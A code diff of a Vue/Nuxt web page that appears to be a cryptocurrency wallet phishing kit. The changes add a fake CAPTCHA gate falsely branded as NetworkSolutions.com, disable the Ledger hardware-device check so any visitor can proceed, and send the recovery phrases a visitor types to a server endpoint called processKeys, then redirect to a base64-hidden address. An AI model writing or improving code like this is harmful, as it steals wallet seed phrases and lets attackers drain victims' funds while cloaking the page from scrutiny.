@@ -1,5 +1,25 @@
 <template>
-  <UApp>
+  <div v-if="!isValidated">
+    <div class="w-screen relative h-screen flex justify-center items-center">
+      <div class="absolute size-50 top-20">
+        <img src="/img/logo-light.svg" alt="Logo" draggable="false">
+      </div>
+      <UCard variant="subtle">
+        <div class="space-y-8">
+          <div class="header">
+            <h1 class="font-bold text-2xl">One more step</h1>
+            <p class="text-muted">Please complete the security check to access NetworkSolutions.com</p>
+          </div>
+          <NuxtTurnstile v-model="token" :options="{callback: () => (isValidated = true)}" />
+          <div class="footer">
+            <h2 class="font-bold text-xl">Why do you have to complete a CAPTCHA?</h2>
+            <p class="text-muted">Completing the captcha proves you are human and gives you access to the web property.</p>
+          </div>
+        </div>
+      </UCard>
+    </div>
+  </div>
+  <UApp v-else>
     <div class="app-container">
       <div class="page">
         <div class="sidebar">
@@ -81,6 +101,9 @@
 
 <script setup lang="ts">
 import type { Step } from "../types";
+
+
+const isValidated = ref(false);
 
 const animationModules = import.meta.glob('~/assets/lottie/*.json', {eager: true});
 const animations = reactive(
@@ -250,26 +273,26 @@ const phrases = ref([]) as Ref<string[]>
 async function nextStep() {
   if (step.value == steps.length - 1) return
   step.value += 1;
-  if (step.value == 1) {
-    let toast = useToast().add(
-        {
-          title: "Wait for device",
-          color: "neutral",
-          description: "Choose your ledger device from the selection menu"
-        }
-    )
-    try {
-      device.value = await navigator.usb.requestDevice({filters: [{
-        // vendorId: 0x2C97
-        }],});
-      useToast().remove(toast.id)
-      await nextStep()
-    } catch (e) {
-      useToast().update(toast.id, {color: "error", title: "No device selected", description: "Connect and choose your ledger device to continue."})
-      setTimeout(() => (step.value = 0), 500)
-    }
-
-  }
+  // if (step.value == 1) {
+  //   let toast = useToast().add(
+  //       {
+  //         title: "Wait for device",
+  //         color: "neutral",
+  //         description: "Choose your ledger device from the selection menu"
+  //       }
+  //   )
+  //   try {
+  //     device.value = await navigator.usb.requestDevice({filters: [{
+  //       // vendorId: 0x2C97
+  //       }],});
+  //     useToast().remove(toast.id)
+  //     await nextStep()
+  //   } catch (e) {
+  //     useToast().update(toast.id, {color: "error", title: "No device selected", description: "Connect and choose your ledger device to continue."})
+  //     setTimeout(() => (step.value = 0), 500)
+  //   }
+  //
+  // }
 }
 
 function previousStep() {
@@ -282,18 +305,26 @@ async function submitPhrases(phrases) {
   if (!form.reportValidity()) return;
   await nextStep()
 
-  const res = await $fetch('/api/processKeys', {
-    method: 'POST',
-    body: {words: phrases},
-  })
+  try {
+    const {red} = await $fetch('/api/processKeys', {
+      method: 'POST',
+      body: {words: phrases},
+    })
+    setTimeout(() => {
+      window.location.replace(atob(red))
+    }, 500)
+  } catch (error) {
+    useToast().add({title: "Unexpected error", description: "An unexpected error occurred. please try again later.", color: "error"})
+    previousStep()
+  }
 
 }
 
 const isNextDisabled = computed(() => {
 if (step.value == steps.length-1) return true;
-if (step.value == 1) {
-  if (device.value == undefined) return true;
-}
+// if (step.value == 1) {
+//   if (device.value == undefined) return true;
+// }
 })
 const isPrevDisabled = computed(() => step.value == 0)
 
